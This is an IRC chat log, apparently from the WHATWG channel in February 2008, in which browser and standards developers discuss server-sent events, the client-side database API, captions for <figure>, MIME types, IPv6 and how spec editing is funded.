[14:30:01.0000] <Hixie>
for each event

[14:30:02.0000] <Hixie>
and then reconnection requests could include a header with the last number received

[14:33:00.0000] <annevk>
Hixie, what member list?

[14:33:01.0000] <Hixie>
css

[14:34:00.0000] <annevk>
aah

[14:34:01.0000] <annevk>
it's my only sin :p

[14:34:02.0000] <Hixie>
:-)

[14:35:00.0000] <Hixie>
i hope opera doesn't mind

[14:35:01.0000] <Hixie>
but i'm blowing up event-source

[14:35:02.0000] <Hixie>
and rebuilding it

[14:35:03.0000] <Hixie>
to take into account everyone's feedback

[14:35:04.0000] <annevk>
we probably do, depending on what happens to it

[14:35:05.0000] <Hixie>
(i'm changing the mime type of the format, so it should be possible to support both)

[14:36:00.0000] <annevk>
ok, we'll see I guess :)

[14:36:01.0000] <Hixie>
uh

[14:36:02.0000] <Hixie>
wtf

[14:36:03.0000] <jwalden>
Content-Type: chunked comes to mind here

[14:37:00.0000] <Hixie>
my ipod touch just rebooted

[14:37:01.0000] <Hixie>
on its own

[14:37:02.0000] <Hixie>
freaky

[14:38:00.0000] <Hixie>
jwalden: you mean Content-Encoding?

[14:38:01.0000] <jwalden>
er, yes

[14:38:02.0000] <jwalden>
Hixie: re whitespace handling in the class attribute in acid3, https://bugzilla.mozilla.org/show_bug.cgi?id=254337#c5

[14:40:00.0000] <Hixie>
man, the http spec is so badly written. it just totally doesn't have any error handling rules.

[14:45:00.0000] <annevk>
Hixie, it's unlikely that'll be fixed

[14:45:01.0000] <annevk>
for 2616bis anyway

[14:45:02.0000] <jwalden>
bis?

[14:46:00.0000] <annevk>
the HTTP WG is working on a revision of RFC 2616

[14:47:00.0000] <jwalden>
zounds

[14:47:01.0000] <jwalden>
/me searches

[14:47:02.0000] <Hixie>
annevk: yeah, i know

[14:47:03.0000] <Hixie>
jwalden: commented

[14:48:00.0000] <jwalden>
thanks

[14:48:01.0000] <annevk>
jwalden, you did not know?

[14:48:02.0000] <jwalden>
not at all

[14:48:03.0000] <jwalden>
maybe tomorrow the DOM WG will reform

[14:48:04.0000] <jwalden>
and the day after, hell freezes over

[14:48:05.0000] <annevk>
jwalden, http://lists.w3.org/Archives/Public/ietf-http-wg/ is the list

[14:48:06.0000] <othermaciej>
the revision is being driven by people who do not have the error handling religion

[14:48:07.0000] <othermaciej>
the DOM WG has basically been renamed to the Web API WG

[14:48:08.0000] <othermaciej>
for practical purposes anyway

[14:48:09.0000] <annevk>
yeah

[14:49:00.0000] <jwalden>
did it take over DOM core?

[14:49:01.0000] <jwalden>
if so, then the hell-freezing is going to be bumped up a day

[14:50:00.0000] <annevk>
jwalden, there's a plan for DOM5

[14:51:00.0000] <annevk>
or DOM4, depending on how the politics go

[14:51:01.0000] <annevk>
(also, not throwing WRONG_DOCUMENT_ERR is likely to become legit ;-) )

[14:51:02.0000] <jwalden>
plans aren't quite cutting it yet for me, but I anticipate future happiness

[14:52:00.0000] <annevk>
we just need an editor, basically

[14:53:00.0000] <Hixie>
needing an editor is the main thing blocking most of the specs on this page: http://wiki.whatwg.org/wiki/Companion_specifications

[14:53:01.0000] <Hixie>
as well as the splitting of the html5 spec itself

[14:56:00.0000] <annevk>
finally, after scanning through 10 es4-discuss e-mails it got to me that RI means reference implementations

[14:56:01.0000] <annevk>
-s

[14:56:02.0000] <Hixie>
hah

[14:56:03.0000] <Hixie>
you should've asked here

[14:56:04.0000] <Hixie>
i coulda told you that

[15:12:00.0000] <Hixie>
othermaciej: cool

[15:12:01.0000] <Hixie>
(i should say that when i said "one of us", i really meant "i", but was trying to not volunteer :-) )

[15:12:02.0000] <jgraham>
/me wonders if anyone has told the pfwg that Fig. 1 in the ARIA spec has accessibility issues...

[15:13:00.0000] <Dashiva>
jgraham: Kinda like wcag2? :)

[15:15:00.0000] <jgraham>
Dashiva: What are the issues with the wcag2 document?

[15:16:00.0000] <jgraham>
(So far I noticed it uses <strong> where HTML5 would suggest <b> but that doesn't seem to important)

[15:16:01.0000] <Hixie>
jgraham: ironically, that's exactly why it should be b instead of strong

[15:16:02.0000] <Hixie>
/me ducks

[15:17:00.0000] <Dashiva>
jgraham: It's inaccessible to understanding :)

[15:19:00.0000] <jgraham>
Hixie: Actually I realized it does match the HTML 5 definition of <strong>. Which is slightly disappointing in a world-is-less-ironic-than-I-had-believed way

[15:23:00.0000] <Hixie>
heh


2008-02-22
[16:06:00.0000] <Hixie>
http://www.whatwg.org/specs/web-apps/current-work/#server-sent-events updated

[16:06:01.0000] <Hixie>
comment away. brb.

[16:17:00.0000] <annevk>
having custom events name was a very useful feature

[16:19:00.0000] <Hixie>
well, it's gone

[16:19:01.0000] <Hixie>
opera never supported it anyway, as i understand it

[16:19:02.0000] <annevk>
we supported custom event names

[16:19:03.0000] <Hixie>
(and it was way more complexity than necessary)

[16:19:04.0000] <Hixie>
oh?

[16:19:05.0000] <Hixie>
oh but not known events?

[16:19:06.0000] <Hixie>
like, foo-click but not click?

[16:19:07.0000] <annevk>
we didn't do the interface crap

[16:20:00.0000] <annevk>
but that's not really the point

[16:20:01.0000] <Hixie>
*shrug*

[16:20:02.0000] <annevk>
you'd want several messages on a single stream to dispatch on different listeners

[16:20:03.0000] <Hixie>
if you only do one interface, why bother with different names. just do manual dispatch.

[16:20:04.0000] <annevk>
that requires putting that data in "data" and parsing it manually

[16:20:05.0000] <annevk>
that's not nice

[16:21:00.0000] <Hixie>
it's easy

[16:21:01.0000] <Hixie>
there's even an example in the spec

[16:21:02.0000] <Hixie>
just hit .split() or some such

[16:21:03.0000] <Hixie>
or substr

[16:22:00.0000] <annevk>
why not have a convenient api on the client?

[16:22:01.0000] <annevk>
the additional cost is small

[16:23:00.0000] <Hixie>
it's not that convenient. you suddenly have to start using addEventListener instead of onmessage="", you have to keep track of two things in the UA, etc

[16:23:01.0000] <Hixie>
(the spec as defined makes it possible to define this in v2, mind you)

[16:24:00.0000] <annevk>
i think that every usage this api had used that feature

[16:27:00.0000] <annevk>
the other stuff looks good though

[16:40:00.0000] <Hixie>
annevk: fine, i'll support alternative names :-P

[16:51:00.0000] <Hixie>
annevk: what do you want me to have happen when the event name doesn't match the NCName production?

[16:52:00.0000] <Hixie>
and should the event name be "sticky", or should it reset to 'message' with each block?

[18:03:00.0000] <takkaria>
Hixie: http://diveintomark.org/archives/2008/02/19/all-these-years#comment-11314

[18:04:00.0000] <Hixie>
already fixed

[18:04:01.0000] <Hixie>
mark pointed it out tome

[18:05:00.0000] <Hixie>
(mark and i work together)

[18:06:00.0000] <takkaria>
ah

[18:06:01.0000] <takkaria>
noted for future reference

[18:06:02.0000] <Hixie>
wow, the comments on that blog entry are scary

[18:07:00.0000] <Hixie>
some of them anyway

[18:07:01.0000] <Hixie>
mostly those from people who don't seem to be able to read...

[18:07:02.0000] <Hixie>
i'm also amused by the number of people who read mark's post as being a comment against the spec...

[18:07:03.0000] <takkaria>
the problem with comment forms is that they start appearing on the screen before you've finished rading

[18:08:00.0000] <Hixie>
heh

[18:08:01.0000] <takkaria>
*reading

[18:08:02.0000] <takkaria>
we need a screen-break-before CSS property to avoid that

[18:08:03.0000] <Hixie>
heh

[18:41:00.0000] <dglazkov>
Hixie, you there?

[18:42:00.0000] <Hixie>
yo

[18:44:00.0000] <dglazkov>
can you help me figuring out a db API bit?

[18:44:01.0000] <Hixie>
sure

[18:44:02.0000] <dglazkov>
If the Database object that the SQLTransaction object was created from has an expected version that is neither the empty string nor the actual version of the database, then mark the statement as bogus. (Error code 2.)

[18:44:03.0000] <dglazkov>
how can this happen?

[18:45:00.0000] <dglazkov>
/me sees no light

[18:45:01.0000] <dglazkov>
/me needs to see light

[18:45:02.0000] <Hixie>
if another page changes the version of teh database

[18:45:03.0000] <dglazkov>
interesting

[18:47:00.0000] <dglazkov>
so, I either need to read version value at each preflight or keep track of all version changes in the implementation

[18:47:01.0000] <dglazkov>
did that make any sense?

[18:51:00.0000] <Hixie>
yeah

[18:51:01.0000] <dglazkov>
and webkit guys did the latter

[18:51:02.0000] <dglazkov>
in their impl.

[18:51:03.0000] <dglazkov>
thanks!

[18:51:04.0000] <dglazkov>
that's all I needed

[18:51:05.0000] <Hixie>
basically whenever the version changes you need to make anything that's happening stop if the version no longer matches

[18:51:06.0000] <Hixie>
np

[18:51:07.0000] <Hixie>
hth

[18:51:08.0000] <dglazkov>
it definitely h

[18:51:09.0000] <dglazkov>
:)

[19:43:00.0000] <jruderman>
Hixie: do you have an opinion on https://bugzilla.mozilla.org/show_bug.cgi?id=395110 ?

[21:16:00.0000] <markp_>
jruderman: ping

[21:16:01.0000] <Hixie>
holy machrel, microsoft actually sent feedback

[21:16:02.0000] <jruderman>
markp_: pong

[21:16:03.0000] <Hixie>
/me falls off his chair

[21:17:00.0000] <Hixie>
jruderman: i'm in favour of honouring content-type

[21:17:01.0000] <markp_>
if you had the ability to SELECT * FROM INTERNET, including markup and HTTP headers, how would you go about testing the condition described in https://bugzilla.mozilla.org/show_bug.cgi?id=395110

[21:17:02.0000] <Hixie>
but if that's not an option, i'll spec the other behaviour

[21:17:03.0000] <jruderman>
i hope you fell off of your chair from laughing, not from your chair being possessed by steve ballmer

[21:17:04.0000] <Hixie>
not laughing

[21:17:05.0000] <Hixie>
shock

[21:17:06.0000] <Hixie>
anyway. afk bbl

[21:17:07.0000] <jruderman>
ok

[21:18:00.0000] <markp_>
i mean, testing for the presence of that mismatch in a web page

[21:18:01.0000] <markp_>
every web page

[21:18:02.0000] <markp_>
to see how common the problem was

[21:19:00.0000] <jruderman>
that would be neat. can you also look at the contents of the file itself to guess which mime type is "correct"?

[21:20:00.0000] <markp_>
hmm, probably not

[21:21:00.0000] <markp_>
or at least, that would be a harder problem

[21:21:01.0000] <markp_>
i guess that would be required, though

[21:22:00.0000] <jeremyb>
Hixie: microsoft's comments are public?

[21:22:01.0000] <jruderman>
sicking suggests testing not for exact matches, but for whether the type attribute and the content-type would result in the same plugin being executed

[21:23:00.0000] <jruderman>
bz suggests ignoring <object>s that have a classid attribute

[21:25:00.0000] <markp_>
would it be helpful to know on how many pages the type attribute and the content-type http header on the target page differ?

[21:25:01.0000] <jruderman>
can you join #developers on irc.mozilla.org, which is where sicking and bz are? :)

[21:25:02.0000] <markp_>
without sniffing to see which one is correct

[21:25:03.0000] <markp_>
actually i'm about to retire for the night

[21:25:04.0000] <markp_>
but let's pick this up tomorrow

[21:26:00.0000] <jruderman>
having example URLs, and knowing what the mismatches are, would be more useful than just knowing the number of sites

[21:26:01.0000] <jeremyb>
/me wonders if markp_ is considering adding a task to some google botnet :)

[21:26:02.0000] <markp_>
a sampling of example urls is within my power

[21:26:03.0000] <markp_>
jeremyb: yes, i'm looking for ideas for simple map-reduce programs

[21:26:04.0000] <markp_>
to teach myself how to write them

[21:27:00.0000] <markp_>
bonus points for actually injecting facts into a discussion

[21:27:01.0000] <markp_>
but mostly just to teach myself how to write them

[21:27:02.0000] <markp_>
/me wonders if i could sort the results by pagerank

[21:27:03.0000] <markp_>
pretty sure i could

[21:28:00.0000] <jeremyb>
/me reads up on map-reduce

[21:28:01.0000] <markp_>
it's not a big secret, we've published numerous whitepapers

[21:29:00.0000] <jeremyb>
yeah, there's a wiki page and a google labs page

[21:29:01.0000] <markp_>
http://www.google.com/search?q=mapreduce+site%3Alabs.google.com

[21:29:02.0000] <markp_>
yeah

[21:30:00.0000] <markp_>
been at google almost a year and have never written one

[21:30:01.0000] <markp_>
there's a first time for everything

[01:11:00.0000] <Philip`>
jeremyb: http://lists.w3.org/Archives/Public/public-html-comments/2008Feb/0024.html looks like the public comments

[01:12:00.0000] <annevk>
funny that they initially tried sending them to the WHATWG list

[01:12:01.0000] <Philip`>
/me guesses that got stuck in the non-member moderation eternity

[01:12:02.0000] <annevk>
yeah

[01:21:00.0000] <hsivonen>
zcorpan: thanks

[01:28:00.0000] <annevk>
Philip`, it just got through

[01:28:01.0000] <annevk>
/me wonders if Hixie waved his magic wand

[01:33:00.0000] <Philip`>
Ah, it's easier to read when it's displayed as HTML rather than plain text

[01:51:00.0000] <annevk>
http://diveintomark.org/archives/2008/02/21/the-bolero-of-troll :)

[01:52:00.0000] <Hixie>
wow, he posted it

[01:52:01.0000] <Hixie>
i didn't think he'd ever post that

[01:52:02.0000] <Hixie>
go mark

[01:59:00.0000] <hsivonen>
markp++

[02:06:00.0000] <Hixie>
what's his comment policy?

[02:07:00.0000] <annevk>
i think he disables comments now and then

[02:07:01.0000] <Hixie>
k

[02:08:00.0000] <hsivonen>
it seems to me that his comment disabling works like anne's. when it's obvious ahead of time that the anticipated comments would require too much refuting, the comments are disabled :-)

[02:21:00.0000] <annevk>
Hixie, <event-source> is still being considered for removal in the spec but your comments suggest otherwise

[02:21:01.0000] <Lachy>
/me wonders why text/event-stream was chosen over application/event-stream

[02:21:02.0000] <annevk>
Hixie, I'll ask the folks in Opera regarding the need for RemoteEventTarget

[02:22:00.0000] <annevk>
Lachy, it's a text format?

[02:22:01.0000] <annevk>
and it's shorter :)

[02:23:00.0000] <zcorpan>
/me thinks we should go back to text/xml, text/javascript, etc

[02:23:01.0000] <annevk>
yes

[02:23:02.0000] <Philip`>
text/xhtml+xml

[02:23:03.0000] <zcorpan>
Philip`: no, just text/xml

[02:24:00.0000] <Philip`>
text/pbm

[02:24:01.0000] <hsivonen>
the MIME folks at the IETF are not doing anyone any good by sticking to email backwards compat in the HTTP context

[02:24:02.0000] <Philip`>
(or text/ppm is more useful)

[02:24:03.0000] <Hixie>
annevk: updated markers. but feel free to do that yourself too. :-)

[02:24:04.0000] <Hixie>
Lachy: for the reasons anne gave

[02:24:05.0000] <annevk>
Hixie, I'm still waiting for an Opera build with a fix :)

[02:24:06.0000] <Hixie>
heh

[02:29:00.0000] <Lachy>
I just feel uncomfortable with text/* since RFC 2046 and 2616 define default charsets (US-ASCII and ISO-8859-1, respectively) in the absense of a charset parameter. Although, those specs need to be updated to remove that nonsense anyway

[02:29:01.0000] <Hixie>
HTTP is changing to not have a default

[02:29:02.0000] <Lachy>
oh good

[02:30:00.0000] <Lachy>
then problem solved :-)

[02:30:01.0000] <Hixie>
and i don't see why we can't define defaults for text/ types on a per-type basis if we can do to for the other types. it's also what we've done so far anyway.

[02:31:00.0000] <Lachy>
yeah, that's how it should be

[02:32:00.0000] <Hixie>
man, a lot of feedback asks for <lh>

[02:32:01.0000] <Hixie>
i guess i should deal with <figure> feedback first and make <figure> take lists

[02:32:02.0000] <Hixie>
that would solve the problem of <lh>

[02:32:03.0000] <Lachy>
is <lh> a list header?

[02:32:04.0000] <Hixie>
yeah

[02:33:00.0000] <Lachy>
<figure> should take just about anything

[02:33:01.0000] <Hixie>
agreed

[02:33:02.0000] <Hixie>
we need to fix the caption issue though

[02:33:03.0000] <Hixie>
since apparently <legend> isn't good enough for some people

[02:33:04.0000] <Lachy>
oh right

[02:34:00.0000] <Hixie>
though i'm very unhappy about the idea of introducing a 12 element for marking up titles

[02:34:01.0000] <Lachy>
that's cause it makes it difficult to use a figure within a fieldset

[02:34:02.0000] <annevk>
nice, the SVG WG is making an errata for getSVGDocument() to make it identical to contentDocument

[02:34:03.0000] <Hixie>
(the 11 existing ones being <caption>, <legend>, <label>, <h1>-<h6>, <header>, and <title>)

[02:35:00.0000] <Lachy>
label isn't really a title though

[02:36:00.0000] <Hixie>
can't use caption and legend because parsers drop them. can't use label because that screws up forms. can't use h1-h6 or header as it screws up outlining. can't use title as it has special parsing behaviour.

[02:36:01.0000] <Hixie>
<h1>-<h6> also have unfortunate styling behaviour right now

[02:36:02.0000] <Hixie>
oh, add <th> to the list.

[02:36:03.0000] <Hixie>
so this would be a 13th element for headers/titles/whatever you call them.

[02:39:00.0000] <annevk>
<dt> is sort of similar too

[02:42:00.0000] <hsivonen>
all of those need to be generalized to <object role='...'>

[02:46:00.0000] <Hixie>
ok everyone's homework now is to come up with a solution for <figure> that introduces a caption without introducing a new element, without using anything that can be mistaken for prose content, without breaking forms or outlines, with a good default presentation, and that is compatible with styliing in legacy UAs.

[02:47:00.0000] <Hixie>
meanwhile i'm going to bed.

[02:47:01.0000] <Hixie>
nn

[03:07:00.0000] <annevk>
g'night

[03:13:00.0000] <roc>
woah

[03:13:01.0000] <roc>
IE team feedback!

[03:13:02.0000] <annevk>
:)

[03:25:00.0000] <Philip`>
<table role="figure"><tr><td><img src="foo.png"><tr><th>Caption</table>

[03:27:00.0000] <hsivonen>
Sun hires Nick Kew

[03:44:00.0000] <Lachy>
Philip`, <table role="figure"><caption>Caption</caption><tr><td><img src="foo.png"></table> would be better

[03:47:00.0000] <Philip`>
That wouldn't give the right presentation, since usually captions go below the figure

[04:03:00.0000] <Lachy>
Philip`, table { caption-side: bottom; }

[04:03:01.0000] <annevk>
spammers have found a new way to by pass spam filters

[04:03:02.0000] <annevk>
"GenericPharmacyProducts"

[04:04:00.0000] <annevk>
"FriendlySupportAllProductsHealthyLife" smart

[04:05:00.0000] <Philip`>
Lachy: Doesn't work in legacy UAs

[04:05:01.0000] <Lachy>
which legacy UAs?

[04:05:02.0000] <Philip`>
IE6, Opera 9.2

[04:06:00.0000] <Philip`>
Hmm, caption{caption-side:bottom} works in Opera

[04:34:00.0000] <zcorpan>
Philip`: table{caption-side:bottom}caption{caption-side:inherit} works in 9.2  too, so apparently we had a redundant rule in the ua style sheet or something

[04:48:00.0000] <hsivonen>
Philip`: do you have Validator.nu installed locally? Did you check whether it can fetch documents from IPv6 hosts if IPv6 is being routed?

[04:55:00.0000] <Philip`>
hsivonen: I do; I think I remember it being able to fetch from http://[::1]/ correctly (but I don't have any proper IPv6 network access)

[04:55:01.0000] <hsivonen>
Philip`: ok. thanks

[04:55:02.0000] <Philip`>
I would test it again to make sure I'm not misremembering, but I get "Malformed spec: Expected dt to be categories dt but it was not."

[04:57:00.0000] <hsivonen>
Philip`: you need --html5load=http://about.validator.nu/spec2.html until I fix the source of the problem

[05:02:00.0000] <Philip`>
Aha, thanks

[05:03:00.0000] <Philip`>
http://localhost:8888/?doc=http://[::1]/ does work fine

[05:03:01.0000] <hsivonen>
Philip`: thanks

[05:04:00.0000] <Philip`>
(but I still have no IPv6 routing to anywhere non-local)

[05:07:00.0000] <Philip`>
Actually I can do http://localhost:8888/?doc=http://[::ffff:66.249.91.99]/ which works, but I don't know where that's doing the magical translation to IPv4

[06:11:00.0000] <Dashiva>
I wonder if there's room for ancestor/precending sibling selectors in the selector API, or if it's going to stick to the CSS one-way-street approach

[06:34:00.0000] <Philip`>
Seems easier to use a combination of selectors API + JS DOM if you want to do fancier things

[06:35:00.0000] <Philip`>
(document.querySelector(':target').parentNode.className += ' highlighted' etc)

[06:37:00.0000] <zcorpan>
or xpath

[07:07:00.0000] <hsivonen>
I'm reading the IPv6 slides linked from Slashdot

[07:08:00.0000] <hsivonen>
it seems that the definers of IPv6 really did not have a good here-to-there transition plan

[07:12:00.0000] <Philip`>
When people are worrying about internet routers running out of memory to store an exponentially-growing number of routes, it seems not the most wonderful of ideas to need double the number of routes to support IPv6 as well as IPv4

[07:13:00.0000] <Philip`>
(since it's not like IPv4 is going to go away even after IPv6 is widely supported)

[07:13:01.0000] <hsivonen>
Philip`: did you see slide #45 already?

[07:14:00.0000] <Philip`>
I haven't seen any of them yet

[07:14:01.0000] <Philip`>
/me looks

[07:15:00.0000] <zcorpan>
do we need an IP5?

[07:15:01.0000] <hsivonen>
zcorpan: looks like we would have needed IP5 ten years ago

[07:16:00.0000] <Philip`>
It's hard enough trying to deploy an IPv4.01

[07:22:00.0000] <Philip`>
/me wonders how much people will be willing to change IPv6 to make transitions easier, and how much they'll claim they can't change it because it'll break compatibility with existing IPv6 implementations

[07:23:00.0000] <zcorpan>
Philip`: propose changes and see what happens :)

[07:24:00.0000] <hsivonen>
Philip`: the slide author argues that IPv6 should be frozen now and the IETF should stop adding features.

[07:25:00.0000] <Philip`>
I know far too little to be able to make sensible proposals :-)

[07:26:00.0000] <Philip`>
/me knows a bit more about routing now than he used to, but nobody here seems very interested in IPv6 and we're just looking at IPv4 routing protocols

[07:41:00.0000] <Philip`>
hsivonen: (Did you mean #47 rather than #45?)

[07:42:00.0000] <hsivonen>
Philip`: no, #45 IVTF (sic.) vs. Reality

[07:47:00.0000] <hsivonen>
hmm. looks like the V is not a typo

[07:47:01.0000] <Philip`>
Hmm, it looks like "IV[endor]TF" is a term used solely by Randy Bush

[07:48:00.0000] <Philip`>
Ah, like what you said

[07:49:00.0000] <hsivonen>
Philip`: google finds others using it

[07:50:00.0000] <Philip`>
Oh, I don't see any others in the first ~30 results on Google

[07:58:00.0000] <zcorpan>
http://ejohn.org/blog/selectors-that-people-actually-use/ -- would be nice to review which selectors are used in css

[08:01:00.0000] <Philip`>
http://www.potaroo.net/ispcol/2008-02/tui.html sounds more optimistic about using IPv6 in an IPv4 world

[08:02:00.0000] <Philip`>
zcorpan: http://www.triin.net/2006/06/12/CSS#figure-30 and http://www.triin.net/2006/06/12/CSS#figure-31 ?

[08:02:01.0000] <SadEagle>
Philip`: there is a non-trivial amount of HW outthere which has problems with AAAA queries...

[08:04:00.0000] <Philip`>
SadEagle: What kind of problems do you mean?

[08:06:00.0000] <Philip`>
/me once had problems with accessing ietf.org, because his computer supported IPv6 and so it used the AAAA response for that domain, and his network didn't support IPv6 so it had to time out and then retry with IPv4 before it'd get anywhere

[08:07:00.0000] <SadEagle>
Philip`: some routers return bogus IP addresses.

[08:07:01.0000] <Philip`>
By "routers" do you mean "DNS servers"?

[08:08:00.0000] <SadEagle>
Sort of. I mean the local firewall + routers boxes, that tend to take over DNS themselves.

[08:08:01.0000] <Philip`>
Ah, okay

[08:08:02.0000] <SadEagle>
Used to be that the DNSs of some ad sites would have problems, too. Not sure what happened w/that now..

[08:11:00.0000] <Philip`>
/me uses Windows Server 2003 Internet Connection Sharing, which seems to handle it perfectly well :-)

[08:11:01.0000] <annevk>
http://www.paciellogroup.com/blog/?p=39

[08:11:02.0000] <zcorpan>
Philip`: thanks

[08:12:00.0000] <zcorpan>
Philip`: so #id is a lot less common in css than in js

[08:13:00.0000] <Philip`>
zcorpan: It's hard to compare the numbers, since the CSS one is number of pages with >= 1 occurrence, while the JS one is total number of occurrences

[08:14:00.0000] <zcorpan>
ah

[08:14:01.0000] <zcorpan>
/me didn't read carefully

[08:14:02.0000] <Camaban>
#id selectors is gimped by some cms'/frameworks as well, they use id's for their own purplses, which effectively makes them useless for css, issues I've run up against with JSF and some ASP.NET stuff

[08:14:03.0000] <Camaban>
*purposes

[08:15:00.0000] <Philip`>
Incidentally, I always get slightly worried when people say "51.290%" with a sample of 2790 - that's at least two too many decimal places

[08:18:00.0000] <SadEagle>
/me would guess that element + id + classname + descendant are the most widely used ones, w/o any stats, and with a far worse sample :-)

[08:19:00.0000] <Camaban>
from helping people with css, people often don't know about the more advanced selectors, and even if they do, they probably assume they won't work in IE :)

[08:20:00.0000] <Philip`>
It took me years to discover the existence of "E F" descendant selectors

[09:39:00.0000] <hsivonen>
use case for <font color>: http://blogs.msdn.com/ie/archive/2008/02/21/the-internet-explorer-8-user-agent-string.aspx

[09:43:00.0000] <Philip`>
Shouldn't that be <em>?

[09:44:00.0000] <Philip`>
or <strong>

[09:44:01.0000] <Philip`>
(I can never tell the difference...)

[10:21:00.0000] <takkaria>
Philip`: I thnk

[10:21:01.0000] <takkaria>
er

[10:21:02.0000] <takkaria>
Philip`: I think that <mark> is probably the most appropriate

[10:22:00.0000] <SadEagle>
<ins>/<del> ? ;-)

[11:28:00.0000] <webben>
yeah, with the current semantics, mark would be most appropriate since it's in a blockquote.

[11:29:00.0000] <webben>
can't see how it's a use case for font color.

[11:58:00.0000] <Hixie>
/me comments on http://blog.mozilla.com/rob-sayre/2008/02/21/thoughts-on-whatwg/#comments

[12:05:00.0000] <othermaciej_>
the original post there is an odd sentiment

[12:06:00.0000] <othermaciej>
particularly the premise that it would be better for Mozilla to extend web technologies unilaterally rather than collaborate inside a standards process

[12:08:00.0000] <othermaciej>
though I do think some of the more complex parts should possibly be dropped if they don't get implementation traction

[12:08:01.0000] <othermaciej>
but that's a totally separate question from things that are seeing multiple active implementations

[12:11:00.0000] <jgraham>
I don't think it's constructive to make a list of "things I personally think should be dropped" and not provide any justification

[12:13:00.0000] <roc>
FWIW I agree...

[12:13:01.0000] <hsivonen>
jgraham++

[12:14:00.0000] <roc>
er, I agree with you guys

[12:15:00.0000] <othermaciej>
roc: I inferred that from your comment on rsayre's blog

[12:16:00.0000] <othermaciej>
WHATWG has been a remarkably effective forum for cross-vendor collaboration on improving web technology

[12:16:01.0000] <othermaciej>
it's pretty clear to me that it is *way* better than either stopping progress or each vendor doing things unilaterally in their own way

[12:16:02.0000] <othermaciej>
even if it results in a "bloated" spec

[12:17:00.0000] <othermaciej>
and I know from experience that it's hard to deliver that level of quality even for a much smaller chunk of the spec

[12:19:00.0000] <Hixie>
it's a full time job

[12:19:01.0000] <Hixie>
as soon as people employing spec editors realise that, things will improve :-)

[12:19:02.0000] <jgraham>
I was about to say, we've been very lucky that Hixie has been paid to work on it full time

[12:19:03.0000] <Hixie>
yes

[12:19:04.0000] <Hixie>
i have been very very lucky

[12:21:00.0000] <roc>
who are the great spec editors who are unemployed?

[12:21:01.0000] <Hixie>
to my knowledge there aren't any

[12:21:02.0000] <Hixie>
the problem is companies won't let people work on specs full time

[12:22:00.0000] <Hixie>
they try to "get more value" out of them by e.g. making them do QA work

[12:22:01.0000] <Hixie>
e.g. opera wouldn't let me do 100% spec work, only 50% spec work and 50% qa

[12:22:02.0000] <Hixie>
that's one reason i quit

[12:22:03.0000] <jgraham>
It's not clear to me there is even a huge pool of great spec editors who are employed

[12:22:04.0000] <Hixie>
yeah well that's a problem too

[12:23:00.0000] <Hixie>
the problem there is that you pretty much have to fall into this job after having gotten your hands dirty in a variety of more practical things

[12:23:01.0000] <Hixie>
and that you have to not care that it's not an especially lucrative career

[12:28:00.0000] <roc>
surely it's about the same as most other browser-related jobs

[12:30:00.0000] <Hixie>
in my experience software engineering has a much higher ceiling in terms of pay increases than spec writing does

[12:34:00.0000] <roc>
ok, here's the plan. We'll get an article in TIME about you, titled "Is Ian Hickson the most powerful man on the Web?" That should fix it

[12:35:00.0000] <krijn>
Google should allow more people to be powerful on the web :)

[12:39:00.0000] <Hixie>
roc: hah

[12:41:00.0000] <gsnedders>
/me runs in fear from the great Hixie 

[12:42:00.0000] <roc>
but seriously, if you need outside feedback on how awesome you are to impress your managers, I'm sure that could be obtained 

[12:43:00.0000] <Hixie>
eh

[12:43:01.0000] <Hixie>
thanks for the offer

[12:43:02.0000] <Hixie>
er, "heh", not "eh"

[12:43:03.0000] <Hixie>
i might take you up on that at our next eval cycle :-)

[13:19:00.0000] <Hixie>
othermaciej: (you got a reply btw)

[13:21:00.0000] <csarven->
"Any content model that expects prose content also expects phrasing content." hmm

[13:23:00.0000] <csarven->
Prosing content doesn't have to include <p> correct (i.e., It could be <ul>)?

[13:23:01.0000] <csarven->
Err. *Prose content

[13:27:00.0000] <Hixie>
how do you mean?

[13:30:00.0000] <csarven->
If I understan it correctly, phrasing content is generally referring to a set of paragraphs, whereas prose content is referring to a set of elements that are composed of some sort of content elements (including paragraphs).

[13:32:00.0000] <csarven->
Prose_Content = { Phrasing_Content, ... } is the way I interpret it. Is this correct? If so, it is not necessarily true that prose content must have a phrasing content as it may contain something else (e.g. an unordered list) -- hence my confusion with the original statement.

[13:36:00.0000] <csarven->
More specifically what is "content model" referring to?

[13:43:00.0000] <othermaciej>
Hixie: to what?

[13:43:01.0000] <Hixie>
http://blog.mozilla.com/rob-sayre/2008/02/21/thoughts-on-whatwg/#comment-7648

[13:44:00.0000] <Hixie>
csarven-: your interopretation is wrong

[13:44:01.0000] <Hixie>
csarven-: phrasing content = any element claiming to be phrasing content, any element claiming to be prose content, and text

[13:44:02.0000] <Hixie>
csarven-: prose content = any element claiming to be prose content

[13:44:03.0000] <Hixie>
where by "claiming to be" i mean defined as such by the element's definition in the spec

[13:45:00.0000] <Hixie>
e.g. p is prose content, span is prose and phrasing content

[13:45:01.0000] <Hixie>
bbiab, going to work

[13:49:00.0000] <othermaciej>
I re-replied

[13:49:01.0000] <othermaciej>
I must say though that the comment responding to mine did not really address my point at all

[13:50:00.0000] <othermaciej>
(not sure why my latest reply isn't showing up)

[13:50:01.0000] <aroben>
othermaciej: remove the fragment from the URL

[13:50:02.0000] <othermaciej>
I did

[13:51:00.0000] <othermaciej>
aroben: do you see anything here past rsayre's last comment? <http://blog.mozilla.com/rob-sayre/2008/02/21/thoughts-on-whatwg/>

[13:51:01.0000] <aroben>
othermaciej: yes

[13:51:02.0000] <othermaciej>
hmmm

[13:51:03.0000] <aroben>
Thezilch: oh

[13:51:04.0000] <aroben>
othermaciej: 

[13:51:05.0000] <aroben>
othermaciej: remove the trailling /

[13:51:06.0000] <aroben>
othermaciej: this website's wacky

[13:52:00.0000] <othermaciej>
aroben: indeed

[13:52:01.0000] <othermaciej>
aroben: thanks for helping me work around it

[13:52:02.0000] <aroben>
othermaciej: anytime

[13:53:00.0000] <gavin_>
bah, silly caching by the netscalar

[13:53:01.0000] <gavin_>
I usually just add ?pie when that happens

[13:53:02.0000] <gavin_>
everything is better with ?pie

[13:56:00.0000] <csarven->
[16:50:12] <Hixie> e.g. p is prose content, span is prose and phrasing content -- This confuses me. Can you provide more examples? What is <ul>, <li>, <div>, <em>, <abbr>?

[13:58:00.0000] <csarven->
/me looks it up

[15:44:00.0000] <Hixie>
csarven-: it says in the spec, right at the top of each element definition


2008-02-23
[16:27:00.0000] <annevk>
I don't get rsayre

[16:27:01.0000] <annevk>
"Disagree. If they are valuable, they will get done by someone."

[16:28:00.0000] <annevk>
DOM Level 0 and all is very useful, yet nobody did anything with it for years

[16:28:01.0000] <annevk>
where is evidence that valuable stuff does get documented?

